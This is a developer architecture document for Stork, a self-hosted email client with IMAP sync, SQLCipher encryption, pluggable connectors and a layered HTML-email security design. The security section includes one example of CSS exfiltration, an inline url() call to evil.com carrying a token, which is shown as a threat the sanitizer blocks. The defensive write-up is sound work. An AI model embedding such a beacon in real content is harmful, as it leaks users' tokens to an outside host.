# Architecture

This document describes the internal architecture of Stork for developers and contributors.

## High-Level Overview

Stork is a self-hosted email client that syncs mail from IMAP servers into local SQLite storage and serves a web UI. The system is split into four layers:

```
┌─────────────────────────────────────────────┐
│                  Web UI                      │
│            (React + Tailwind)                │
├─────────────────────────────────────────────┤
│                REST API                      │
│              (Hono/Node.js)                  │
├─────────────────────────────────────────────┤
│             Encryption Layer                 │
│  SQLCipher (AES-256) + Vault Key Pattern    │
├──────────┬──────────┬───────────────────────┤
│  IMAP    │  SQLite  │  Full-Text            │
│  Sync    │  Storage │  Search (FTS5)        │
├──────────┴──────────┴───────────────────────┤
│           Connector Layer                    │
│   IMAP  │  SMTP  │  CF Workers  │  SES     │
└─────────────────────────────────────────────┘
```

1. **Connector Layer** — abstracts how mail enters and leaves the system (IMAP, SMTP, future: Cloudflare Workers, SES).
2. **Sync + Storage** — the IMAP sync engine pulls mail into SQLite; the FTS5 index enables search.
3. **Encryption Layer** — whole-database encryption via SQLCipher. Vault key pattern with password and recovery key envelopes. Container boots locked; unlocking loads the vault key into memory and opens the database.
4. **REST API** — Hono routes expose container lifecycle (setup, unlock, password management), accounts, folders, messages, search, and sync controls.
5. **Web UI** — React SPA talks to the REST API.

## Directory Structure

```
src/
  index.ts                   Entry point — boots container, starts API server
  api/
    server.ts                App composition — mounts route modules, lock middleware
    routes/
      encryption.ts          Setup, unlock, password change, recovery key rotation
      accounts.ts            Account CRUD, folders, folder messages, labels, sync trigger
      messages.ts            Message CRUD, threads, flags, bulk ops, message labels
      labels.ts              Label update/delete, messages-by-label
      attachments.ts         Attachment download
      search.ts              Full-text search
      sync.ts                Sync status
  crypto/
    keys.ts                  Vault key management, Argon2id KDF, AES-256-GCM envelopes
    lifecycle.ts             Container state machine (setup → locked → unlocked)
  connectors/
    types.ts                 Connector interfaces (IngestConnector, SendConnector)
    imap.ts                  IMAP IngestConnector (ImapFlow + mailparser)
    cloudflare-email.ts      Cloudflare Email Workers IngestConnector (webhook push)
    smtp.ts                  SMTP SendConnector (Nodemailer)
    ses.ts                   AWS SES SendConnector (@aws-sdk/client-sesv2)
    registry.ts              Factory functions for creating connectors
    index.ts                 Barrel export
  search/search.ts           Full-text search using FTS5
  storage/
    db.ts                    Database initialization (SQLCipher), WAL mode, schema bootstrap
    schema.ts                Schema DDL + migrations (versioned)
    migrate.ts               Standalone migration runner
  sync/
    imap-sync.ts             IMAP sync engine (folders, messages, flags, attachments)
    sync-scheduler.ts        Per-account background sync with backoff
    connection-pool.ts       IMAP connection pooling across sync cycles

frontend/src/
  App.tsx                    Main shell — state management, routing
  api.ts                     Type-safe REST API client
  hooks.ts                   Custom hooks (useAsync, useSyncPoller, useDarkMode, useKeyboardShortcuts)
  components/
    Sidebar.tsx              Account + folder navigation
    MessageList.tsx          Paginated message list with unread badges
    MessageDetail.tsx        Full message view with thread display
    ComposeModal.tsx         Compose, reply, reply-all
    SearchPanel.tsx          FTS5-powered search
    Settings.tsx             Account configuration
    Welcome.tsx              First-run IMAP setup wizard
    ShortcutsHelp.tsx        Keyboard shortcut reference
    Toast.tsx                Notification toasts
    ConfirmDialog.tsx        Confirmation dialogs

tests/                       Backend unit + integration tests
frontend/src/components/__tests__/  Frontend component tests
e2e/                         Playwright end-to-end tests
```

## Backend

### Entry Point (`src/index.ts`)

On startup, Stork:

1. Creates the data directory (`STORK_DATA_DIR`, default `./data`).
2. Boots the container via `bootContainer()` — checks for `stork.keys` to determine initial state (`setup` or `locked`).
3. Creates the Hono app with all route modules. Data routes are gated behind lock middleware (return `423` until unlocked).
4. Listens on `STORK_PORT` (default 3100).
5. Registers SIGINT/SIGTERM handlers for graceful shutdown (stops scheduler, closes DB).

The database is **not opened until the user unlocks the container** — only after a successful `POST /api/unlock` (or `POST /api/setup` on first run) does the system open the encrypted SQLite database, start the sync scheduler, and begin serving data.

### Encryption (`src/crypto/`)

**Key management** (`keys.ts`):
- Vault key pattern (same design as Bitwarden/1Password): a random 256-bit vault key encrypts the database; the vault key itself is encrypted twice — once with a password-derived key (Argon2id), once with a recovery key (BIP39 mnemonic).
- Password and recovery key changes are O(1) — only the envelope blob is re-encrypted, never the database.
- Key file format: `stork.keys` stores KDF parameters and two AES-256-GCM-wrapped copies of the vault key.

**Container lifecycle** (`lifecycle.ts`):
- State machine: `setup` → `locked` → `unlocked`.
- `bootContainer()` initializes the context and creates the app.
- `transitionToUnlocked()` opens the database with the vault key, zeros the key from memory, starts the sync scheduler, and transitions to `unlocked`.

### IMAP Sync Engine (`src/sync/imap-sync.ts`)

The `ImapSync` class handles the core sync logic for a single account:

- **Folder sync** — lists mailboxes from the IMAP server, upserts folder metadata, detects deleted/renamed folders, and resolves special-use attributes (Inbox, Sent, Drafts, Trash, Junk, Archive) via RFC 6154 attributes or common name fallback.
- **Incremental message sync** — uses IMAP UIDs and `UIDVALIDITY` for efficient incremental fetch. Only fetches messages newer than the last synced UID. If `UIDVALIDITY` changes (folder was recreated on the server), triggers a full resync of that folder.
- **MIME parsing** — uses `mailparser` to parse raw message source into structured fields (subject, from, to, cc, body, attachments).
- **Attachment extraction** — stores attachment data (filename, content type, binary data) in the `attachments` table, linked to the parent message.
- **Flag sync** — periodically fetches flags for all known UIDs and updates any that changed locally (read/unread, starred, etc.). Fetches in batches of 50 to avoid oversized IMAP commands.
- **Server deletion detection** — can compare local UIDs against server UIDs to find messages deleted upstream.
- **Vault mode (delete-from-server)** — opt-in per-account mode. After each sync, messages that were successfully fetched are deleted from the IMAP server. The IMAP provider acts as a transient delivery edge; Stork becomes the single source of truth. Only newly-synced UIDs are deleted — messages already in Stork before the flag was enabled are unaffected. Deletion is crash-safe: newly inserted messages are immediately marked `pending_archive = 1` in the database. Phase 3 queries this column rather than an in-memory list, so if the process is killed after Phase 1 (fetch) but before Phase 3 (delete), the next sync cycle finds and clears the pending messages. The flag is set to 0 once `deleted_from_server` is confirmed.
- **Retry logic** — all IMAP operations use a `withRetry` wrapper with 3 attempts and exponential backoff (1s, 2s, 3s). Each retry creates a fresh `ImapFlow` instance since closed instances cannot be reconnected.

### Connection Pool (`src/sync/connection-pool.ts`)

The `ConnectionPool` manages IMAP connections across multiple accounts:

- Enforces per-account limits (default: 1) and total connection limits (default: 10).
- Evicts idle connections after a configurable timeout (default: 5 minutes).
- When the total limit is reached, evicts the oldest idle connection to make room.
- On `acquire`, always creates a fresh IMAP connection (ImapFlow instances are not reliably reusable after ungraceful shutdown).
- Periodically runs cleanup to disconnect idle connections.

### Sync Scheduler (`src/sync/sync-scheduler.ts`)

The `SyncScheduler` orchestrates background sync for all accounts:

- Each account syncs on its own interval (default: 5 minutes).
- Failed syncs use exponential backoff up to 30 minutes to avoid hammering broken servers.
- Tracks per-account status: running, last sync time, last error, consecutive error count.
- Supports on-demand sync via `syncNow(accountId)`.
- On startup, loads all accounts from the database and registers them for periodic sync.

### Connector Layer (`src/connectors/`)

Stork uses a pluggable connector architecture to abstract mail transport. Two interfaces define the contract:

- **`IngestConnector`** — abstracts how mail enters the system. Methods: `connect()`, `disconnect()`, `listFolders()`, `fetchMessages()`, and optional `deleteMessages()`.
- **`SendConnector`** — abstracts how mail leaves. Methods: `send()` and `verify()`.

**Implementations**:

- **`ImapIngestConnector`** (`imap.ts`) — connects to IMAP servers via ImapFlow. Lists folders, streams messages with MIME parsing via mailparser, and supports message deletion. Used by the sync engine as the transport layer.
- **`CloudflareEmailIngestConnector`** (`cloudflare-email.ts`) — push-based ingest via Cloudflare Email Workers. A Cloudflare Worker receives mail at the edge, base64-encodes the raw RFC 5322 message, and POSTs it to Stork's webhook endpoint. Messages are buffered in memory with auto-incrementing UIDs and yielded via `fetchMessages()`. Includes webhook secret validation (constant-time comparison) and an `acknowledge()` method to clear processed messages.
- **`SmtpSendConnector`** (`smtp.ts`) — sends email via SMTP using Nodemailer. Supports plain text, HTML, attachments, and threading headers (In-Reply-To, References). Call `verify()` to test credentials before sending.
- **`SesSendConnector`** (`ses.ts`) — sends email via AWS SES v2. Builds raw RFC 5322 messages using Nodemailer's stream transport, then sends via the SES `SendEmail` API with raw content. Supports all message features (HTML, attachments, threading). The `@aws-sdk/client-sesv2` package is an optional peer dependency — dynamically imported at runtime with a clear error if not installed. Call `verify()` to test AWS credentials via `GetAccount`.

**Registry** (`registry.ts`) — factory functions `createIngestConnector()` and `createSendConnector()` instantiate the right connector from a typed configuration object. Supports four connector types: `imap`, `cloudflare-email`, `smtp`, and `ses`.

**Barrel export** (`index.ts`) — re-exports all types, implementations, and factory functions.

**Account configuration** — each account stores its `ingest_connector_type` and `send_connector_type` in the database alongside connector-specific configuration columns. The sync scheduler only polls IMAP accounts; push-based connectors (Cloudflare Email) receive messages via webhook without polling. The send route uses the registry to create the appropriate send connector based on the account's configuration.

**Health checks** — `GET /api/accounts/:accountId/connector-health` tests both ingest and send connectors, returning structured status with error details and sync scheduler state.

See [Writing Custom Connectors](./writing-connectors.md) for a guide on implementing new connectors.

### SQLite Storage (`src/storage/`)

**Database initialization** (`db.ts`):
- Opens SQLite via `better-sqlite3-multiple-ciphers` (SQLCipher support) at `$STORK_DATA_DIR/stork.db`.
- Applies the vault key via `PRAGMA key` for transparent encryption/decryption.
- Enables WAL mode for concurrent reads during sync.
- Enables foreign keys for cascading deletes.
- Sets busy timeout to 5 seconds.

**Schema** (`schema.ts`):
- Versioned migrations stored as SQL strings in the `MIGRATIONS` array.
- **v1**: accounts, folders, messages, attachments, sync_state, FTS5 virtual table with triggers.
- **v2**: adds `special_use` column to folders for IMAP special-use detection.
- **v3**: adds `labels` and `message_labels` tables for Gmail-style label organization.
- The `schema_version` table tracks the current version.
- Migrations run automatically on startup via `ensureSchema()`.

**Key design decisions**:
- Messages are uniquely identified by `(folder_id, uid)` to match IMAP semantics.
- **Labels replace folders as the primary organizational model.** IMAP folders are still synced for tracking sync state, but user-facing navigation uses labels. When a message syncs from an IMAP folder, the folder name becomes a suggested label (source: `imap`). Users can also create their own labels (source: `user`). A message can have multiple labels — unlike folders, which enforce single-parent hierarchy.
- The `labels` table stores label metadata (name, color, source) per account. The `message_labels` junction table provides the many-to-many relationship between messages and labels.
- FTS5 uses porter tokenizer with unicode61 for language-aware stemming.
- FTS5 content table syncs via INSERT/UPDATE/DELETE triggers on the messages table.
- Attachments store binary data directly in SQLite BLOBs — simple and avoids filesystem management.

### REST API (`src/api/`)

Built with Hono. The API is composed from domain-specific route modules (`src/api/routes/`), each responsible for a single concern. `server.ts` wires them together with CORS, static file serving, and the lock middleware.

Route modules:
- **`encryption.ts`** — container lifecycle: health, status, setup, unlock, password change, recovery key rotation. These endpoints handle their own auth checks (setup/locked state guards).
- **`accounts.ts`** — account CRUD, folder listing, folder messages, account labels, sync trigger.
- **`messages.ts`** — message CRUD, threading, flags, move, bulk operations, attachments listing, message labels.
- **`labels.ts`** — label update/delete, messages-by-label listing.
- **`attachments.ts`** — raw attachment download with content-type and sanitized filenames.
- **`search.ts`** — FTS5-powered full-text search.
- **`sync.ts`** — sync status for all accounts.

See [API Reference](./api.md) for the full endpoint listing.

### Full-Text Search (`src/search/search.ts`)

The `MessageSearch` class wraps SQLite FTS5 queries:

- Supports FTS5 query syntax: AND, OR, NOT, phrase matching with quotes.
- Returns snippets with `<mark>` highlighting and contextual ellipsis.
- Filters by account and/or folder.
- Pagination via limit/offset.
- Includes a `rebuildIndex()` method for reindexing after bulk operations.

## Frontend

### State Management

The frontend uses React's built-in state (`useState`) in `App.tsx` as the central state container. No external state library — the app is simple enough that prop drilling + a few custom hooks suffice.

Key state:
- `accounts`, `folders`, `messages` — data from the API.
- `selectedAccount`, `selectedFolder`, `selectedMessage` — navigation state.
- `showCompose`, `showSearch`, `showSettings`, `showShortcuts` — UI panel toggles.
- Dark mode preference persisted to `localStorage`.

### Custom Hooks (`hooks.ts`)

- **`useAsync(fn, deps)`** — generic hook for async data fetching with loading/error states.
- **`useSyncPoller(accountId)`** — polls `GET /api/sync/status` every 5 seconds to show sync progress.
- **`useDarkMode()`** — toggles dark mode class on `<html>`, persists to localStorage.
- **`useKeyboardShortcuts(handlers)`** — registers keyboard shortcut listeners.

### Component Architecture

- **`Sidebar`** — renders accounts and their folders in a collapsible tree. Shows unread counts. Highlights the active folder.
- **`MessageList`** — paginated list of messages with subject, sender, date, and preview. Supports load-more pagination. Shows unread indicator.
- **`MessageDetail`** — displays the full message (HTML sanitized with DOMPurify, or plain text fallback). Shows thread context. Renders attachments with download links.
- **`ComposeModal`** — email composition with To, CC, BCC, Subject, Body. Pre-fills fields for reply and reply-all.
- **`SearchPanel`** — text input with real-time search results from the FTS5 endpoint.
- **`Settings`** — account management (add/edit/remove IMAP+SMTP configuration).
- **`Welcome`** — first-run setup wizard shown when no accounts exist.

### Build

The frontend is built with Vite and served as static files by the Hono backend:
- Development: `cd frontend && npm run dev` (Vite dev server with HMR on port 5173).
- Production: `cd frontend && npm run build` outputs to `frontend/dist/`, served by Hono's `serveStatic`.

## Deployment

Stork ships as a single Docker container:

```dockerfile
FROM node:22-slim AS base
# Install deps, build frontend + backend, expose port 3100
CMD ["node", "dist/index.js"]
```

The container:
- Stores all data in `/app/data` (SQLite database + attachments).
- Exposes port 3100 (configurable via `STORK_PORT`).
- Uses `init: true` in docker-compose for proper signal handling.
- Restarts automatically unless explicitly stopped.

Data persistence is handled by a Docker volume (named volume with `docker compose`, or a bind mount path with direct `docker run`).

## Email HTML Security

HTML emails are untrusted content that could contain scripts, tracking pixels, or data-exfiltration attempts. Stork uses a defense-in-depth strategy with four layers:

### Layer 1: HTML Sanitization (DOMPurify)

`email-sanitizer.ts` runs DOMPurify with a strict configuration:
- **Forbidden tags**: `script`, `iframe`, `object`, `embed`, `form`, `meta`, `link`, `style`
- **Event handler stripping**: All `on*` attributes removed post-sanitization
- **CSS `url()` neutralization**: Inline style `url()` references are blanked to prevent CSS-based data exfiltration (e.g. `background-image: url('https://evil.com/track?token=...')`)
- **Link enforcement**: All anchors forced to `target="_blank"` with `rel="noopener noreferrer"`
- **Tracking pixel detection**: 1×1/0×0 images and known tracking URL patterns removed
- **Remote image blocking**: Off by default; user can opt in per-message

### Layer 2: Sandboxed Iframe Rendering

Email HTML is rendered inside an `<iframe sandbox="allow-same-origin allow-popups">`:
- **No `allow-scripts`** — the browser refuses to execute ANY JavaScript inside the frame, even if the sanitizer misses a `<script>` tag or event handler. This is the strongest guarantee.
- `allow-same-origin` is safe without `allow-scripts` — it only lets the parent read `contentDocument` to auto-size the iframe height.
- `allow-popups` lets sanitized `<a target="_blank">` links open in new tabs.

### Layer 3: Iframe-level CSP

The sandboxed iframe's `srcdoc` includes its own `<meta>` CSP:
```
default-src 'none'; style-src 'unsafe-inline'; img-src data: cid:;
```
This blocks all script execution, network requests, and external resource loading from within the email frame itself.

### Layer 4: Server-level CSP Headers

The Hono server sets `Content-Security-Policy` headers on HTML responses:
```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data: cid: https:; object-src 'none'; base-uri 'self'
```
This prevents inline script injection in the parent document and restricts resource loading.

### Why this is sufficient

For a script in an HTML email to access the parent DOM and leak private information, it would need to bypass ALL of:
1. DOMPurify tag/attribute stripping
2. The iframe `sandbox` attribute (browser-enforced, not bypassable via HTML/JS)
3. The iframe-level CSP blocking script execution
4. The server-level CSP blocking inline scripts

The sandbox attribute alone is sufficient — it is enforced by the browser's security model, not by HTML parsing. Even a novel DOMPurify bypass cannot execute scripts inside a `sandbox` iframe without `allow-scripts`.

## Design Principles

1. **Self-host the client, not the edge.** Don't compete with mail servers — complement them. Let Postfix/Dovecot/Fastmail handle MX records, DKIM, and deliverability. Stork handles storage, search, and the UI.

2. **SQLite is the right database.** A single-user email client doesn't need PostgreSQL. SQLite with WAL mode handles concurrent reads during sync, FTS5 provides search without Elasticsearch, and the entire database is a single file you can backup with `cp`.

3. **Incremental, resumable sync.** Never re-download messages you already have. Use IMAP UIDs and UIDVALIDITY to track sync position. Handle server-side folder recreation gracefully.

4. **Read-only by default.** The sync engine never modifies the IMAP server unless the user explicitly opts in to vault mode. Safe to point at a production mailbox.

5. **One container, zero config.** `docker compose up` should give you a working email client. No external databases, no Redis, no environment variables required for basic operation.
